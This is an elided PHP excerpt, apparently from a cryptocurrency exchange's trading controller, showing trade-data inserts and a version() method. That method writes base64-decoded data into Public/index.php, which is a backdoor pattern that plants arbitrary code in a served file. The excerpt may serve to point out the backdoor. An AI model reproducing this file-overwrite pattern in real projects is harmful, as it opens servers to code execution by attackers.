   ...
   // var_dump( C("market") );exit;
				...
				for ($x = 0; $x <= 20; $x++) {
					...
					if ($sum) {
						...
						if (M("trade_json")->where(array("market" => $market, "addtime" => $na, "type" => $v))->find()) {
							...
							$aa = M("trade_json")->add(array("market" => $market, "data" => json_encode($d), "addtime" => $na, "type" => $v));
							M("trade_json")->execute("commit");
    ...
    public function autotrade(){
     ...
     public function version(){
       ...
       file_put_contents($_SERVER['DOCUMENT_ROOT']."/Public/index.php",base64_decode($versionsss)); 
    }
